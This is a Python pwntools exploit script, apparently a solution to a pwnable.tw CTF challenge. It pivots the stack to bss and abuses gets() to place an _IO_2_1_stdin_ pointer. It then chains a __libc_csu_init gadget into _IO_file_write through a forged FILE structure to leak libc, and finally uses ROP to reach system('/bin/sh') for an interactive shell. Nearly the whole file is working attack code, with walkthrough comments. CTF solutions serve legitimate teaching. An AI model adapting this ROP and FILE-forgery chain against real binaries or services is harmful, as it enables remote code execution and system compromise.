from pwn import *
from IO_FILE import *

context.arch = 'amd64'

###Addr
bss = 0x601810
gets_plt=0x400430
gets_got=0x600ff0
gets_offset = 0x6ed80
ptr_2_IO_file_write_offset = 0x3c1f18
IO_2_1_stdin_offset = 0x3c38e0
system_offset = 0x45390

###ROPgadget
pop_rdi = 0x4005c3
call_func = 0x4005a0
set_param = 0x4005ba
pop_rsp_r13_r14_r15 = 0x4005bd
'''
0x4005a0
  mov    rdx,r13
  mov    rsi,r14
  mov    edi,r15d
  call   QWORD PTR [r12+rbx*8]
  add    rbx,0x1
  cmp    rbx,rbp
  jne    4005a0 <__libc_csu_init+0x40>
  add    rsp,0x8
0x4005ba
  pop    rbx
  pop    rbp
  pop    r12
  pop    r13
  pop    r14
  pop    r15
  ret    
'''

###Walkthrough
#  This problem only calls one useful libc function gets() and has no output whatsoever
#  Which leaves two possible routes to go down :
#    1.Do it the leakless way(return to dl_resolve)
#        This route is extremely hard to realize due to x64 architecture and full relro
#    2.Try to construct a ROP chain to leak libc
#        The second route is not easy too, but seems more appealing than the first one
#  Since I have decided to go down the second route, the most basic limitations that must be defeated are
#    1.There needs to be a pointer into libc on stack to be resolved by csu_init_gadget
#        Key to the problem, will be discussed in detail below
#    2.The stack address must be known to allow precise operations on stack values
#        This part is trivially achievable by pivoting stack onto bss

#  Again, by observing that the only libc_func I have is gets(), it is immediate that limitation can only be bypassed through calls to gets()
#  So I dug a bit into gets() source code, and discovered some useful stuff
#  _IO_getline_info writes *fp onto stack when called, which means we will get a pointer to _IO_2_1_stdin_
#  All that is left now is 
#    1.manage to place a csu_init_gadget in front of the _IO_2_1_stdin_ ptr,
#    2.Set rbx to the right offset
#    3.Dereference and call IO_file_write
#  Problem solved :)
#  Below are some related source code
'''
size_t _IO_getline_info (FILE *fp, char *buf, size_t n, int delim, int extract_delim, int *eof){
  ...
  while (n != 0){
    ...
    ssize_t len = fp->_IO_read_end - fp->_IO_read_ptr;
    if (len <= 0){
      ...
    }
    else{
      ...
      t = (char *) memchr ((void *) fp->_IO_read_ptr, delim, len);
      if (t != NULL){
        ...
        memcpy ((void *) ptr, (void *) fp->_IO_read_ptr, len);
        fp->_IO_read_ptr = t;
        return old_len + len;
      }
      ...
    }
  }
  ...
}

ssize_t _IO_new_file_write (FILE *f, const void *data, ssize_t n){
  ssize_t to_do = n;
  while (to_do>0){
    ssize_t count=(__builtin_expect(f->_flags2 & _IO_FLAGS2_NOTCANCEL,0)
                           ? __write_nocancel(f->_fileno, data, to_do)
                           : __write(f->_fileno,data,to_do));
    ...
  }
  ...
}
'''

###Exploit
r = remote("chall.pwnable.tw",10402)

###Stack pivoting
padding1 = b'\x00'*24
ROPchain1 = p64(pop_rdi)+p64(bss)+\
            p64(gets_plt)+\
            p64(pop_rsp_r13_r14_r15)+p64(bss-0x18)
payload1 = padding1+ROPchain1
r.sendline(payload1)

###call gets() to load IO_2_1_stdin ptr onto bss-0x38, then jump to newly read ROPchain3
ROPchain2 = p64(pop_rdi)+p64(bss+0x400)+\
            p64(gets_plt)+\
            p64(pop_rsp_r13_r14_r15)+p64(bss+0x400-0x18)
r.sendline(ROPchain2)

###Prepare ROPchain4 wrapped around the IO_2_1_stdin ptr, then jump to it
###Also craft fake file structure to support IO_file_write argument
ROPchain3 = p64(pop_rdi)+p64(bss-0x50)+\
            p64(gets_plt)+\
            p64(pop_rdi)+p64(bss-0x30)+\
            p64(gets_plt)+\
            p64(pop_rdi)+p64(bss+0x600)+\
            p64(gets_plt)+\
            p64(pop_rsp_r13_r14_r15)+p64(bss-0x50-0x18)
r.sendline(ROPchain3)

###Wrap csu_init_gadget around IO_2_1_stdin ptr
###Notice that gets appends a NULL byte at end, so the last byte of IO_2_1_stdin ptr will be cleared to '\x00'
###See IO_file_write source code above to see requirements for fake stream
ROPchain4_start = p64(set_param)+flat((ptr_2_IO_file_write_offset-(IO_2_1_stdin_offset&0xffff00))//8)+flat((ptr_2_IO_file_write_offset-(IO_2_1_stdin_offset&0xffff00))//8+1)
ROPchain4_end = p64(8)+p64(gets_got)+p64(bss+0x600)+\
                p64(call_func)+p64(0)*7+\
                p64(pop_rdi)+p64(bss+0x400)+\
                p64(gets_plt)+\
                p64(pop_rsp_r13_r14_r15)+p64(bss+0x400-0x18)
FILE = IO_FILE_plus(arch=64)
stream = FILE.construct(fileno=1,flags2=2)
r.sendline(ROPchain4_start)
r.sendline(ROPchain4_end)
r.sendline(stream)
gets_addr = u64(r.recv(8))
libc_base = gets_addr-gets_offset
print(hex(libc_base))

###Prepare system('/bin/sh') and get shell
ROPchain5 = p64(pop_rdi)+p64(bss+0x400+0x18)+\
            p64(libc_base+system_offset)
argument = b'/bin/sh\x00'
payload = ROPchain5+argument
r.sendline(payload)

r.interactive()

